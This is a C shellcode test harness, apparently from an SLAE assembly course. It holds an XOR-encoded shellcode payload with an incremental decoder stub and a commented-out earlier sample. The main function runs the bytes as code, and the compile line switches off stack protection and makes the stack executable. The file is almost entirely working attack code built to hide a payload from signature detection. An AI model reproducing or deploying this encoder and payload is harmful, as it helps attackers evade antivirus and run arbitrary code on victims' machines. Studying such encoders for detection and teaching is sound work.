// Filename: shellcode.c
// Author:  SLAE-935
//
// Purpose: Execute the incremental decoder stub on the partial xored chunk of encoded shellcode

#include<stdio.h>
#include<string.h>
unsigned char code[] = \
// Sample without Encryption: "\xbb\xfb\xe7\xb6\xfd\x53\x31\xd2\x52\x5a\x5b\xeb\x45\x5f\x31\xc9\x39\xca\x74\x26\x31\xc9\x8a\x0d\x47\x82\x04\x08\x53\x52\x89\xd6\x0f\xaf\xf1\xc1\xe6\x02\x01\xfe\x89\xcb\x80\xeb\x01\xc1\xe3\x02\x8b\x14\x1e\x89\x14\x1f\xe2\xf0\x5a\x5b\x31\xc9\x8a\x0d\x47\x82\x04\x08\x31\x5c\x8f\xfc\xe2\xfa\x03\x1f\x53\x42\x52\xe8\x05\x00\x00\x00\xe8\xb6\xff\xff\xff\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x0c";
// Decoder Stub + Encoded shellcode with Xor:
"\xbb\xfb\xe7\xb6\xfd\x53\x31\xd2\x52\x5a\x5b\xeb\x3d\x5f\x31\xc9\x39\xca\x74\x22\x31\xc9\xb1\x0c\x53\x52\x89\xd6\x0f\xaf\xf1\xc1\xe6\x02\x01\xfe\x89\xcb\x80\xeb\x01\xc1\xe3\x02\x8b\x14\x1e\x89\x14\x1f\xe2\xf0\x5a\x5b\x31\xc9\xb1\x0c\x31\x5c\x8f\xfc\xe2\xfa\x03\x1f\x53\x42\x52\xe8\x05\x00\x00\x00\xe8\xbe\xff\xff\xff\xca\x27\xe6\x95\xd4\xc8\xc5\x95\x93\xc8\xd4\x94\x95\x6e\x55\xad\x72\x05\xe5\x74\x1a\x57\xbd\x30\x7b\x77\x26\x6d";
void main()
{
    printf("Shellcode Length:  %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}

// Compile with:
// gcc -fno-stack-protector -z execstack shellcode.c -o shellcode